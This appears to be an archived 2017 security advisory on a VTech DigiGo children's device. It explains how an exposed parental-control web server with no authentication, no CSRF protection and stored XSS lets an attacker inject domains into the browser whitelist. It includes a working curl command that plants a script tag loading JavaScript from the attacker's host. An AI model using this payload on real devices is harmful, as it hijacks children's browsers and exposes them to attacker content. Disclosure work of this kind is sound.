@@ -1,0 +1,72 @@
+id: 29531
+date: 01/16/2018
+title: VTech DigiGo 83.60630 Browser Overlay Attack Vulnerability
+author: Sipke Mellema
+cves: 
+
+------------------------------------------------------------------------
+Multiple vulnerabilities in VTech DigiGo allow browser overlay attack
+------------------------------------------------------------------------
+Sipke Mellema, September 2017
+
+------------------------------------------------------------------------
+Abstract
+------------------------------------------------------------------------
+VTech's DigiGo is a hand held smart device for children. The device
+contains a browser that allows children to connect to websites on a
+whitelist. Attackers can remotely add an entry to the whitelist to
+perform a persistent overlay attack on the browser app.
+
+------------------------------------------------------------------------
+Tested versions
+------------------------------------------------------------------------
+This issue was tested on a VTech DigiGo running firmware version
+83.60630. It is likely that other versions are also affected.
+
+------------------------------------------------------------------------
+Fix
+------------------------------------------------------------------------
+VTech pushed a firmware update to address this issue on 6 November,
+2017. The firmware version still displays as 83.60630.
+
+------------------------------------------------------------------------
+Details
+------------------------------------------------------------------------
+https://sumofpwn.nl/advisory/2017/multiple-vulnerabilities-in-vtech-digigo-allow-browser-overlay-attack.html
+
+The internet browser of the DigiGo is designed for kids. Only whitelisted domains are allowed to be visited. The device contains an initial list of domains. When the browser is opened, a control menu is displayed. From the control menu a kid can visit websites from a whitelist. The control menu also includes the Parental Control menu, that allows adding domains to the whitelist. Both menu's are HTML pages running on a webserver on the DigiGo. The webserver gets started when opening the browser.
+
+In the examples below the IP address of the DigiGo is 192.168.1.152, and the attacker has the IP address 192.168.1.142.
+
+
+Parental control is accessible from the network
+
+An internal webserver is started on the DigiGo when the browser is started. This webserver doesn't just listen on a loopback interface, but is accessible from anywhere on the network. The link for the Parental Control menu is:
+
+http://192.168.1.152/wwwsrc/Parental_Control.html
+
+
+Missing Cross-Site Request Forgery in domain whitelist form
+
+The form to add domains to the whitelist does not require any authentication, and it's not protected against CSRF-attacks. These properties allow an attacker to remotely inject domains to the whitelist. To add a domain, a POST request is performed to:
+
+http://192.168.1.152/UpdatePA.cgi
+
+
+Persistent Cross-Site Scripting in domain whitelist
+
+Domains in the whitelist have a title and a description. The title attribute can be injeted with malicious Javascript. Whitelisted domains are listed on the internal HTML page every time the browser is opened.
+Putting it together
+
+
+When the browser is started, a webserver is started on the DigiGo. The browser will display pages from its local webserver, and those pages include the whitelisted domains. Domains can be remotely injected to hijack the page on the internal webserver, allowing changes to the entire browser window.
+
+If a device on the same network as the DigiGo visits an attacker controlled domain, it's possible to remotely attack the DigiGo via Cross-Site Request Forgery. For this attack to work the attacker has to know the DigiGo's IP address in advance, or scan the network via Javascript.
+
+If the attacker is on the same network, injecting a domain with a malicious title is as simple as:
+
+curl --data "ACTION=0&ITEMID=-1&TITLE=hax%3Cscript+src%3D%22http%3A%2F%2F192.168.1.142%3A1234%2Finject.js%22%2F%3E&URL=http%3A%2F%2Fwww.securify.nl&DOMAIN=securify.nl&ICON=nil&DESC=Injecting+backdoor+into+browser" http://192.168.1.152/cgi-bin/UpdatePA.cgi
+
+The browser will now include Javascript from http://192.168.1.142:1234/inject.js every time the browser is opened, rendering the browser in control of the attacker.
+
+#  0day.today [2023-03-22]  #
